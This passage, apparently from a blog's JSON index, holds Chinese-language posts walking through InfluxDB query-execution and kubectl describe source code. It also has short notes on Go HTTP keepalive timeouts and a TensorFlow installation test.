stmt.(*influxql.SelectStatement); ok &#123; for _, s := range stmt.Sources &#123; switch s := s.(type) &#123; case *influxql.Measurement: if influxql.IsSystemName(s.Name) &#123; command := \"the appropriate meta command\" switch s.Name &#123; case \"_fieldKeys\": command = \"SHOW FIELD KEYS\" case \"_measurements\": command = \"SHOW MEASUREMENTS\" case \"_series\": command = \"SHOW SERIES\" case \"_tagKeys\": command = \"SHOW TAG KEYS\" case \"_tags\": command = \"SHOW TAG VALUES\" &#125; results &lt;- &amp;Result&#123; Err: fmt.Errorf(\"unable to use system source '%s': use %s instead\", s.Name, command), &#125; break LOOP &#125; &#125; &#125; &#125; // Rewrite statements, if necessary. // This can occur on meta read statements which convert to SELECT statements. newStmt, err := RewriteStatement(stmt) if err != nil &#123; results &lt;- &amp;Result&#123;Err: err&#125; break &#125; stmt = newStmt // Normalize each statement if possible. if normalizer, ok := e.StatementExecutor.(StatementNormalizer); ok &#123; if err := normalizer.NormalizeStatement(stmt, defaultDB, opt.RetentionPolicy); err != nil &#123; if err := ctx.send(&amp;Result&#123;Err: err&#125;); err == ErrQueryAborted &#123; return &#125; break &#125; &#125; // Log each normalized statement. if !ctx.Quiet &#123; e.Logger.Info(\"Executing query\", zap.Stringer(\"query\", stmt)) &#125; // Send any other statements to the underlying statement executor. err = e.StatementExecutor.ExecuteStatement(stmt, ctx) if err == ErrQueryInterrupted &#123; // Query was interrupted so retrieve the real interrupt error from // the query task if there is one. if qerr := ctx.Err(); qerr != nil &#123; err = qerr &#125; &#125; // Send an error for this result if it failed for some reason. if err != nil &#123; if err := ctx.send(&amp;Result&#123; StatementID: i, Err: err, &#125;); err == ErrQueryAborted &#123; return &#125; // Stop after the first error. break &#125; // Check if the query was interrupted during an uninterruptible statement. interrupted := false select &#123; case &lt;-ctx.Done(): interrupted = true default: // Query has not been interrupted. &#125; if interrupted &#123; break &#125; &#125; // Send error results for any statements which were not executed. for ; i &lt; len(query.Statements)-1; i++ &#123; if err := ctx.send(&amp;Result&#123; StatementID: i, Err: ErrNotExecuted, &#125;); err == ErrQueryAborted &#123; return &#125; &#125;&#125; 函数AttachQuery用于管理当前查询的query的状态 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859// AttachQuery attaches a running query to be managed by the TaskManager.// Returns the query id of the newly attached query or an error if it was// unable to assign a query id or attach the query to the TaskManager.// This function also returns a channel that will be closed when this// query finishes running.//// After a query finishes running, the system is free to reuse a query id.func (t *TaskManager) AttachQuery(q *influxql.Query, opt ExecutionOptions, interrupt &lt;-chan struct&#123;&#125;) (*ExecutionContext, func(), error) &#123; t.mu.Lock() defer t.mu.Unlock() if t.shutdown &#123; return nil, nil, ErrQueryEngineShutdown &#125; if t.MaxConcurrentQueries &gt; 0 &amp;&amp; len(t.queries) &gt;= t.MaxConcurrentQueries &#123; return nil, nil, ErrMaxConcurrentQueriesLimitExceeded(len(t.queries), t.MaxConcurrentQueries) &#125; qid := t.nextID //初始化task query := &amp;Task&#123; query: q.String(), database: opt.Database, status: RunningTask, startTime: time.Now(), closing: make(chan struct&#123;&#125;), monitorCh: make(chan error), &#125; t.queries[qid] = query go t.waitForQuery(qid, query.closing, interrupt, query.monitorCh)//开启协程来监听query是否结束。 if t.LogQueriesAfter != 0 &#123; go query.monitor(func(closing &lt;-chan struct&#123;&#125;) error &#123; timer := time.NewTimer(t.LogQueriesAfter)//检测到慢查询的时候，报警。 defer timer.Stop() select &#123; case &lt;-timer.C: t.Logger.Warn(fmt.Sprintf(\"Detected slow query: %s (qid: %d, database: %s, threshold: %s)\", query.query, qid, query.database, t.LogQueriesAfter)) case &lt;-closing: &#125; return nil &#125;) &#125; t.nextID++ //初始化一个ctx上下文 ctx := &amp;ExecutionContext&#123; Context: context.Background(), QueryID: qid, task: query, ExecutionOptions: opt, &#125; ctx.watch() // detach query，从查询table中去除。 return ctx, func() &#123; t.DetachQuery(qid) &#125;, nil &#125; 将解析出来的statement执行函数ExecuteStatement 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162// ExecuteStatement executes the given statement with the given execution context.func (e *StatementExecutor) ExecuteStatement(stmt influxql.Statement, ctx *query.ExecutionContext) error &#123; // Select statements are handled separately so that they can be streamed. //特殊处理select查询 if stmt, ok := stmt.(*influxql.SelectStatement); ok &#123; return e.executeSelectStatement(stmt, ctx) &#125; var rows models.Rows var messages []*query.Message var err error switch stmt := stmt.(type) &#123; //根据每个类别分别处理不同type的查询语句，有点多，自己看下吧~~~ case *influxql.AlterRetentionPolicyStatement: if ctx.ReadOnly &#123; messages = append(messages, query.ReadOnlyWarning(stmt.String())) &#125; err = e.executeAlterRetentionPolicyStatement(stmt) case *influxql.CreateContinuousQueryStatement: if ctx.ReadOnly &#123; messages = append(messages, query.ReadOnlyWarning(stmt.String())) &#125; err = e.executeCreateContinuousQueryStatement(stmt) case *influxql.CreateDatabaseStatement: if ctx.ReadOnly &#123; messages = append(messages, query.ReadOnlyWarning(stmt.String())) &#125; err = e.executeCreateDatabaseStatement(stmt) case *influxql.CreateRetentionPolicyStatement: if ctx.ReadOnly &#123; messages = append(messages, query.ReadOnlyWarning(stmt.String())) &#125; err = e.executeCreateRetentionPolicyStatement(stmt) case *influxql.CreateSubscriptionStatement: if ctx.ReadOnly &#123; messages = append(messages, query.ReadOnlyWarning(stmt.String())) &#125; err = e.executeCreateSubscriptionStatement(stmt) case *influxql.CreateUserStatement: if ctx.ReadOnly &#123; messages = append(messages, query.ReadOnlyWarning(stmt.String())) &#125; err = e.executeCreateUserStatement(stmt) case *influxql.DeleteSeriesStatement: err = e.executeDeleteSeriesStatement(stmt, ctx.Database) case *influxql.DropContinuousQueryStatement: if ctx.ReadOnly &#123; messages = append(messages, query.ReadOnlyWarning(stmt.String())) &#125; err = e.executeDropContinuousQueryStatement(stmt) case *influxql.DropDatabaseStatement: if ctx.ReadOnly &#123; messages = append(messages, query.ReadOnlyWarning(stmt.String())) &#125; err = e.executeDropDatabaseStatement(stmt) case *influxql.DropMeasurementStatement: if ctx.ReadOnly &#123; messages = append(messages, query.ReadOnlyWarning(stmt.String())) &#125; err = e.executeDropMeasurementStatement(stmt, ctx.Database) case *influxql.DropSeriesStatement: if ctx.ReadOnly &#123; messages = append(messages, query.ReadOnlyWarning(stmt.String())) &#125; err = e.executeDropSeriesStatement(stmt, ctx.Database) case *influxql.DropRetentionPolicyStatement: if ctx.ReadOnly &#123; messages = append(messages, query.ReadOnlyWarning(stmt.String())) &#125; err = e.executeDropRetentionPolicyStatement(stmt) case *influxql.DropShardStatement: if ctx.ReadOnly &#123; messages = append(messages, query.ReadOnlyWarning(stmt.String())) &#125; err = e.executeDropShardStatement(stmt) case *influxql.DropSubscriptionStatement: if ctx.ReadOnly &#123; messages = append(messages, query.ReadOnlyWarning(stmt.String())) &#125; err = e.executeDropSubscriptionStatement(stmt) case *influxql.DropUserStatement: if ctx.ReadOnly &#123; messages = append(messages, query.ReadOnlyWarning(stmt.String())) &#125; err = e.executeDropUserStatement(stmt) case *influxql.ExplainStatement: if stmt.Analyze &#123; rows, err = e.executeExplainAnalyzeStatement(stmt, ctx) &#125; else &#123; rows, err = e.executeExplainStatement(stmt, ctx) &#125; case *influxql.GrantStatement: if ctx.ReadOnly &#123; messages = append(messages, query.ReadOnlyWarning(stmt.String())) &#125; err = e.executeGrantStatement(stmt) case *influxql.GrantAdminStatement: if ctx.ReadOnly &#123; messages = append(messages, query.ReadOnlyWarning(stmt.String())) &#125; err = e.executeGrantAdminStatement(stmt) case *influxql.RevokeStatement: if ctx.ReadOnly &#123; messages = append(messages, query.ReadOnlyWarning(stmt.String())) &#125; err = e.executeRevokeStatement(stmt) case *influxql.RevokeAdminStatement: if ctx.ReadOnly &#123; messages = append(messages, query.ReadOnlyWarning(stmt.String())) &#125; err = e.executeRevokeAdminStatement(stmt) case *influxql.ShowContinuousQueriesStatement: rows, err = e.executeShowContinuousQueriesStatement(stmt) case *influxql.ShowDatabasesStatement: rows, err = e.executeShowDatabasesStatement(stmt, ctx) case *influxql.ShowDiagnosticsStatement: rows, err = e.executeShowDiagnosticsStatement(stmt) case *influxql.ShowGrantsForUserStatement: rows, err = e.executeShowGrantsForUserStatement(stmt) case *influxql.ShowMeasurementsStatement: return e.executeShowMeasurementsStatement(stmt, ctx) case *influxql.ShowMeasurementCardinalityStatement: rows, err = e.executeShowMeasurementCardinalityStatement(stmt) case *influxql.ShowRetentionPoliciesStatement: rows, err = e.executeShowRetentionPoliciesStatement(stmt) case *influxql.ShowSeriesCardinalityStatement: rows, err = e.executeShowSeriesCardinalityStatement(stmt) case *influxql.ShowShardsStatement: rows, err = e.executeShowShardsStatement(stmt) case *influxql.ShowShardGroupsStatement: rows, err = e.executeShowShardGroupsStatement(stmt) case *influxql.ShowStatsStatement: rows, err = e.executeShowStatsStatement(stmt) case *influxql.ShowSubscriptionsStatement: rows, err = e.executeShowSubscriptionsStatement(stmt) case *influxql.ShowTagKeysStatement: return e.executeShowTagKeys(stmt, ctx) case *influxql.ShowTagValuesStatement: return e.executeShowTagValues(stmt, ctx) case *influxql.ShowUsersStatement: rows, err = e.executeShowUsersStatement(stmt) case *influxql.SetPasswordUserStatement: if ctx.ReadOnly &#123; messages = append(messages, query.ReadOnlyWarning(stmt.String())) &#125; err = e.executeSetPasswordUserStatement(stmt) case *influxql.ShowQueriesStatement, *influxql.KillQueryStatement: // Send query related statements to the task manager. return e.TaskManager.ExecuteStatement(stmt, ctx) default: return query.ErrInvalidQuery &#125; if err != nil &#123; return err &#125; return ctx.Send(&amp;query.Result&#123; Series: rows, Messages: messages, &#125;)&#125; 针对不同类型的statment执行不同的查询tsdb过程。以select查询为例。，executeSelectStatement单独处理，为了能够streamed。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091func (e *StatementExecutor) executeSelectStatement(stmt *influxql.SelectStatement, ctx *query.ExecutionContext) error &#123; //创建迭代器 cur, err := e.createIterators(ctx, stmt, ctx.ExecutionOptions) if err != nil &#123; return err &#125; // Generate a row emitter from the iterator set. // 从迭代器中生成一个row emitter，chunkSize大小。 em := query.NewEmitter(cur, ctx.ChunkSize) defer em.Close() // Emit rows to the results channel. var writeN int64 var emitted bool var pointsWriter *BufferedPointsWriter if stmt.Target != nil &#123; //初始化 pointsWriter = NewBufferedPointsWriter(e.PointsWriter, stmt.Target.Measurement.Database, stmt.Target.Measurement.RetentionPolicy, 10000) &#125; for &#123; // 查询数据 row, partial, err := em.Emit() if err != nil &#123; return err &#125; else if row == nil &#123; // Check if the query was interrupted while emitting. select &#123; case &lt;-ctx.Done(): return ctx.Err() default: &#125; break &#125; // Write points back into system for INTO statements. // INTO不为空，则写入这个pointswriter if stmt.Target != nil &#123; if err := e.writeInto(pointsWriter, stmt, row); err != nil &#123; return err &#125; writeN += int64(len(row.Values)) continue &#125; result := &amp;query.Result&#123; Series: []*models.Row&#123;row&#125;, Partial: partial, &#125; // Send results or exit if closing. //发送结果 if err := ctx.Send(result); err != nil &#123; return err &#125; emitted = true &#125; // Flush remaining points and emit write count if an INTO statement. if stmt.Target != nil &#123; if err := pointsWriter.Flush(); err != nil &#123; return err &#125; var messages []*query.Message if ctx.ReadOnly &#123; messages = append(messages, query.ReadOnlyWarning(stmt.String())) &#125; return ctx.Send(&amp;query.Result&#123; Messages: messages, Series: []*models.Row&#123;&#123; Name: \"result\", Columns: []string&#123;\"time\", \"written\"&#125;, Values: [][]interface&#123;&#125;&#123;&#123;time.Unix(0, 0).UTC(), writeN&#125;&#125;, &#125;&#125;, &#125;) &#125; // Always emit at least one result. if !emitted &#123; return ctx.Send(&amp;query.Result&#123; Series: make([]*models.Row, 0), &#125;) &#125; return nil&#125; emit函数查询获取数据并返回: 123456789101112131415161718192021222324252627282930313233343536// Emit returns the next row from the iterators.func (e *Emitter) Emit() (*models.Row, bool, error) &#123; // Continually read from the cursor until it is exhausted. for &#123; // Scan the next row. If there are no rows left, return the current row. var row Row if !e.cur.Scan(&amp;row) &#123; if err := e.cur.Err(); err != nil &#123; return nil, false, err &#125; r := e.row e.row = nil return r, false, nil &#125; // If there's no row yet then create one. // If the name and tags match the existing row, append to that row if // the number of values doesn't exceed the chunk size. // Otherwise return existing row and add values to next emitted row. if e.row == nil &#123; e.createRow(row.Series, row.Values) &#125; else if e.series.SameSeries(row.Series) &#123; if e.chunkSize &gt; 0 &amp;&amp; len(e.row.Values) &gt;= e.chunkSize &#123;//如果查询数据量大于chunkSize，则返回，同时 partial=true标识。 r := e.row r.Partial = true e.createRow(row.Series, row.Values) return r, true, nil &#125; e.row.Values = append(e.row.Values, row.Values) &#125; else &#123; r := e.row e.createRow(row.Series, row.Values) return r, true, nil &#125; &#125;&#125; 总结大概看了下influxdb从启动到服务查询接口的整体流程。以select为例，看了不同的query查询和解析方式类似，都需要走解析查询的。词法解析器是 influxdb自己写的。 底层如何构建的以后再讨论吧。还有很多细节需要自己去看下了。orz","categories":[{"name":"influxdb","slug":"influxdb","permalink":"http://www.yorzorzy.xyz/categories/influxdb/"}],"tags":[{"name":"influxdb","slug":"influxdb","permalink":"http://www.yorzorzy.xyz/tags/influxdb/"}]},{"title":"golang","slug":"gotips","date":"2017-05-26T12:12:57.000Z","updated":"2020-01-17T08:29:36.679Z","comments":true,"path":"2017/05/26/gotips/","link":"","permalink":"http://www.yorzorzy.xyz/2017/05/26/gotips/","excerpt":"","text":"golang超时问题golang中http请求经常遇到的问题，本人也遇到过超时的情况。写个笔记记录下。 当在编写一个Go语言的HTTP服务端或者是客户端时，超时是最容易同时也是最敏感的错误，有很多选择，一个错误可以导致很长时间没有结果，知道网络出现故障，或者进程宕掉。 在分析过程中，发现服务之间调用有EOF的问题，一般情况下是两个服务之间的readtimeout和writetimeout设置超时导致的。当然也有一个keepalive超时的问题。需要保证服务A调用服务B的时候，服务A的keepalive大于服务B的keepalive。 python服务器gunicon在设置keepalive的时候，之前遇到过默认情况的keepalive时间给了5s钟，遇到服务A的keepalive时间大于60s的时候，可能服务B的连接已经断开了，但是服务A还维持的会话，当获取数据的时候发现读取数据失败返回EOF问题了。 建议保证：服务B的Keepalive时间 &gt; 服务A的keepalive时间 参考资料https://studygolang.com/articles/7692","categories":[{"name":"golang","slug":"golang","permalink":"http://www.yorzorzy.xyz/categories/golang/"}],"tags":[{"name":"golang","slug":"golang","permalink":"http://www.yorzorzy.xyz/tags/golang/"}]},{"title":"kubectl 学习笔记","slug":"kubectl","date":"2017-05-26T12:12:57.000Z","updated":"2020-01-17T08:25:53.716Z","comments":true,"path":"2017/05/26/kubectl/","link":"","permalink":"http://www.yorzorzy.xyz/2017/05/26/kubectl/","excerpt":"","text":"kubectl 学习笔记思考：kubectl 和docker命令源码的设计思想类似。 docker中启动了服务器接受请求注册api, 而kubectl发送命令给apiserver请求数据或者创建资源。 Cmds是kubectl中的命令集合，所有命令都会整理在里面。 Cmd 是命令的实体，其中主要是具体执行用户命令。每个cmd负责一个命令执行类型(describe,get…)。 Builder 是cmd执行操作时的辅助工具，主要是负责封装与Apiserver交互的底层操作，和将Apiserver的返回数据转化为统一数据结构。 Kubectl 依赖于cobra包构建命令行支持，该包是支持通用的命令行构建库。 12345678Cmds(命令集合)&lt;---Cmd(命令obj) | | | | | | | Builder | | | | |----------Cmd(命令obj) Kubectl 的执行流程分析以describe命令分析。 用户发起请求 根据用户执行动作分发给处理对应动作的Cmd (Cmd是执行用户命令的实体) 解析用户命令 向Apiserver获取数据 整理返回为通用的数据集合 找到解释查询类型数据的句柄 使用具柄对整理出的数据集合进行打印输出 1kubectl describe node node1 如下, NewKubectlCommand 方法中cobra会根据命令动作将请求分配给describe注册的cmd。 123456789101112131415161718192021222324252627groups :&#x3D; templates.CommandGroups&#123; &#x2F;&#x2F;... &#123; Message: &quot;Troubleshooting and Debugging Commands:&quot;, Commands: []*cobra.Command&#123; NewCmdDescribe(f, out, err), &#x2F;&#x2F;&lt;------describe操作的cmd NewCmdLogs(f, out), NewCmdAttach(f, in, out, err), NewCmdExec(f, in, out, err), NewCmdPortForward(f, out, err), NewCmdProxy(f, out), NewCmdCp(f, out, err), auth.NewCmdAuth(f, out, err), &#125;, &#125;, &#123; Message: &quot;Advanced Commands:&quot;, Commands: []*cobra.Command&#123; NewCmdApply(&quot;kubectl&quot;, f, out, err), NewCmdPatch(f, out), NewCmdReplace(f, out), NewCmdConvert(f, out), &#125;, &#125;, &#x2F;&#x2F; ... &#125; groups.Add(cmds) Cmd会对获取用户输入数据， 并检查正确性然后使用Run函数处理。 12345678910111213141516171819202122232425262728293031func NewCmdDescribe(f cmdutil.Factory, out, cmdErr io.Writer) *cobra.Command &#123; options :&#x3D; &amp;resource.FilenameOptions&#123;&#125; describerSettings :&#x3D; &amp;printers.DescriberSettings&#123;&#125; validArgs :&#x3D; printersinternal.DescribableResources() argAliases :&#x3D; kubectl.ResourceAliases(validArgs) cmd :&#x3D; &amp;cobra.Command&#123; Use: &quot;describe (-f FILENAME | TYPE [NAME_PREFIX | -l label] | TYPE&#x2F;NAME)&quot;, Short: i18n.T(&quot;Show details of a specific resource or group of resources&quot;), Long: describeLong + &quot;\\n\\n&quot; + cmdutil.ValidResourceTypeList(f), Example: describeExample, Run: func(cmd *cobra.Command, args []string) &#123; &#x2F;&#x2F; &lt;------处理回调函数 err :&#x3D; RunDescribe(f, out, cmdErr, cmd, args, options, describerSettings) cmdutil.CheckErr(err) &#125;, ValidArgs: validArgs, &#x2F;&#x2F;&lt;-----------------合法性检查 ArgAliases: argAliases, &#125; usage :&#x3D; &quot;containing the resource to describe&quot; cmdutil.AddFilenameOptionFlags(cmd, options, usage) &#x2F;&#x2F; 下面主要是输入参数检查 cmd.Flags().StringP(&quot;selector&quot;, &quot;l&quot;, &quot;&quot;, &quot;Selector (label query) to filter on, supports &#39;&#x3D;&#39;, &#39;&#x3D;&#x3D;&#39;, and &#39;!&#x3D;&#39;.(e.g. -l key1&#x3D;value1,key2&#x3D;value2)&quot;) cmd.Flags().Bool(&quot;all-namespaces&quot;, false, &quot;If present, list the requested object(s) across all namespaces. Namespace in current context is ignored even if specified with --namespace.&quot;) cmd.Flags().BoolVar(&amp;describerSettings.ShowEvents, &quot;show-events&quot;, true, &quot;If true, display events related to the described object.&quot;) cmdutil.AddInclude3rdPartyFlags(cmd) cmdutil.AddIncludeUninitializedFlag(cmd) return cmd&#125; 如下, 在 RunDescribe 中时对该命令的具体处理 Builder(), Unstructured(), ContinueOnError(). NamespaceParam(), FilenameParam(), LabelSelectorParam() … Flatten() 的链式调用流程主要是为执行命令做准备。 Do() 函数是注册具体向Apiserver请求数据，和讲返回数据转化为通用结构的方法。 最后的 describer.Describe（） 函数是将提取出的返回数据 打印出来做可视化接口。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061func RunDescribe(f cmdutil.Factory, out, cmdErr io.Writer, cmd *cobra.Command, args []string, options *resource.FilenameOptions, describerSettings *printers.DescriberSettings) error &#123; &#x2F;&#x2F; ... &#x2F;&#x2F; include the uninitialized objects by default &#x2F;&#x2F; unless user explicitly set --include-uninitialized&#x3D;false includeUninitialized :&#x3D; cmdutil.ShouldIncludeUninitialized(cmd, true) r :&#x3D; f.NewBuilder(). Unstructured(). ContinueOnError(). NamespaceParam(cmdNamespace).DefaultNamespace().AllNamespaces(allNamespaces). FilenameParam(enforceNamespace, options). LabelSelectorParam(selector). &#x2F;&#x2F; 设置用户的标签选择 IncludeUninitialized(includeUninitialized). ResourceTypeOrNameArgs(true, args...). &#x2F;&#x2F; 提取用户选择操作的对象类型 Flatten(). &#x2F;&#x2F;决定以何种方式从K8s的返回数据中提取信息 Do() &#x2F;&#x2F;执行命令获取数据 &#x2F;&#x2F; ... infos, err :&#x3D; r.Infos() if err !&#x3D; nil &#123; if apierrors.IsNotFound(err) &amp;&amp; len(args) &#x3D;&#x3D; 2 &#123; return DescribeMatchingResources(f, cmdNamespace, args[0], args[1], describerSettings, out, err) &#125; allErrs &#x3D; append(allErrs, err) &#125; errs :&#x3D; sets.NewString() first :&#x3D; true for _, info :&#x3D; range infos &#123; mapping :&#x3D; info.ResourceMapping() describer, err :&#x3D; f.Describer(mapping) if err !&#x3D; nil &#123; if errs.Has(err.Error()) &#123; continue &#125; allErrs &#x3D; append(allErrs, err) errs.Insert(err.Error()) continue &#125; &#x2F;&#x2F; 下面通过describe 方法将提取到的数据 打印出来 s, err :&#x3D; describer.Describe(info.Namespace, info.Name, *describerSettings) if err !&#x3D; nil &#123; if errs.Has(err.Error()) &#123; continue &#125; allErrs &#x3D; append(allErrs, err) errs.Insert(err.Error()) continue &#125; if first &#123; first &#x3D; false fmt.Fprint(out, s) &#125; else &#123; fmt.Fprintf(out, &quot;\\n\\n%s&quot;, s) &#125; &#125; return utilerrors.NewAggregate(allErrs)&#125; 下面具体分析获取数据的流程，获取数据包括从Apiserver请求数据以及从返回信息中提取有用数据两个操作。 RetrieveLazy 中注册了从Apiserver获取数据的操作。NewDecoratedVisitor 中注册了从获取到的数据结构中转化出通用数据的方法。 1234567891011121314151617181920212223242526&#x2F;&#x2F; inputs are consumed by the first execution - use Infos() or Object() on the Result to capture a list&#x2F;&#x2F; for further iteration.func (b *Builder) Do() *Result &#123; r :&#x3D; b.visitorResult() &#x2F;&#x2F;... helpers :&#x3D; []VisitorFunc&#123;&#125; &#x2F;&#x2F;注册获取数据前的动作 if b.defaultNamespace &#123; helpers &#x3D; append(helpers, SetNamespace(b.namespace)) &#125; if b.requireNamespace &#123; helpers &#x3D; append(helpers, RequireNamespace(b.namespace)) &#125; helpers &#x3D; append(helpers, FilterNamespace) if b.requireObject &#123; &#x2F;&#x2F;注册从Apiserver获取数据的方法 helpers &#x3D; append(helpers, RetrieveLazy) &#125; &#x2F;&#x2F;注册从返回数据中提取信息的方法 r.visitor &#x3D; NewDecoratedVisitor(r.visitor, helpers...) if b.continueOnError &#123; r.visitor &#x3D; ContinueOnErrorVisitor&#123;r.visitor&#125; &#125; return r&#125; 12345678910&#x2F;&#x2F; RetrieveLazy updates the object if it has not been loaded yet.func RetrieveLazy(info *Info, err error) error &#123; if err !&#x3D; nil &#123; return err &#125; if info.Object &#x3D;&#x3D; nil &#123; return info.Get() &#x2F;&#x2F;从Apiserver获取数据 &#125; return nil&#125; 而 NewDecoratedVisitor 方法注册了数据处理的关键函数 Visit， 这个函数可以使用户可以将来自Apiserver的数据转化为通用数据集合。 123456789101112131415161718192021222324&#x2F;&#x2F; NewDecoratedVisitor will create a visitor that invokes the provided visitor functions before&#x2F;&#x2F; the user supplied visitor function is invoked, giving them the opportunity to mutate the Info&#x2F;&#x2F; object or terminate early with an error.func NewDecoratedVisitor(v Visitor, fn ...VisitorFunc) Visitor &#123; if len(fn) &#x3D;&#x3D; 0 &#123; return v &#125; return DecoratedVisitor&#123;v, fn&#125;&#125;&#x2F;&#x2F; Visit implements Visitorfunc (v DecoratedVisitor) Visit(fn VisitorFunc) error &#123; return v.visitor.Visit(func(info *Info, err error) error &#123; if err !&#x3D; nil &#123; return err &#125; for i :&#x3D; range v.decorators &#123; if err :&#x3D; v.decorators[i](info, nil); err !&#x3D; nil &#123; return err &#125; &#125; return fn(info, nil) &#125;)&#125; 打印提取到的数据主要是调用注册的describe方法，会根据用户的请求如下获取对应的describe 1describer, err :&#x3D; f.Describer(mapping) Describe 集合中注册了 对K8s各种数据的打印方法(针对visit转化后的通用数据) 1234567891011121314151617func init() &#123; d :&#x3D; &amp;Describers&#123;&#125; err :&#x3D; d.Add( describeLimitRange, describeQuota, describePod, describeService, describeReplicationController, describeDaemonSet, describeNode, &#x2F;&#x2F;打印节点 describeNamespace, ) if err !&#x3D; nil &#123; glog.Fatalf(&quot;Cannot register describers: %v&quot;, err) &#125; DefaultObjectDescriber &#x3D; d&#125; 使用获取到的对应的Describe作打印 123456&#x2F;&#x2F;遍历整理出的返回信息for _, info :&#x3D; range infos &#123; &#x2F;&#x2F; 执行打印操作 s, err :&#x3D; describer.Describe(info.Namespace, info.Name, *describerSettings) &#x2F;&#x2F; ... &#125;","categories":[{"name":"k8s","slug":"k8s","permalink":"http://www.yorzorzy.xyz/categories/k8s/"}],"tags":[{"name":"k8s","slug":"k8s","permalink":"http://www.yorzorzy.xyz/tags/k8s/"}]},{"title":"tensorflow环境安装","slug":"tensorflow安装小结","date":"2017-05-26T12:12:57.000Z","updated":"2020-01-18T14:31:32.879Z","comments":true,"path":"2017/05/26/tensorflow安装小结/","link":"","permalink":"http://www.yorzorzy.xyz/2017/05/26/tensorflow%E5%AE%89%E8%A3%85%E5%B0%8F%E7%BB%93/","excerpt":"","text":"深度学习环境 tensorflow安装环境准备需要支持RTX2080ti显卡，最好有11g现存。 本人使用CUDA10.1，cudnn 10.1适配。 python3.7 pycharm安装。 anaconde3 安装多次使用了 anaconde3 4.4 版本安装上了。 之后安装tensorflow，安装版本1.13版本的支持10.1的版本的tensorflow. 运行测试123456789101112131415161718192021222324252627# -*- coding: utf-8 -*-import tensorflow as tf# 创建一个变量, 初始化为标量 0.state = tf.Variable(0, name=\"counter\")# 创建一个 op, 其作用是使 state 增加 1one = tf.constant(1)new_value = tf.add(state, one)update = tf.assign(state, new_value)# 启动图后, 变量必须先经过`初始化` (init) op 初始化,# 首先必须增加一个`初始化` op 到图中.# initialize_all_variables 警告换成 global_variables_initializerinit_op = tf.global_variables_initializer()# 启动图, 运行 opwith tf.Session() as sess: # 运行 'init' op sess.run(init_op) # 打印 'state' 的初始值 print(sess.run(state)) # 运行 op, 更新 'state', 并打印 'state' for i in range(3): sess.run(update) print(sess.run(state)) 运行成功则正常。 开启旅程啦~~","categories":[{"name":"深度学习","slug":"深度学习","permalink":"http://www.yorzorzy.xyz/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"深度学习","slug":"深度学习","permalink":"http://www.yorzorzy.xyz/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}]}]}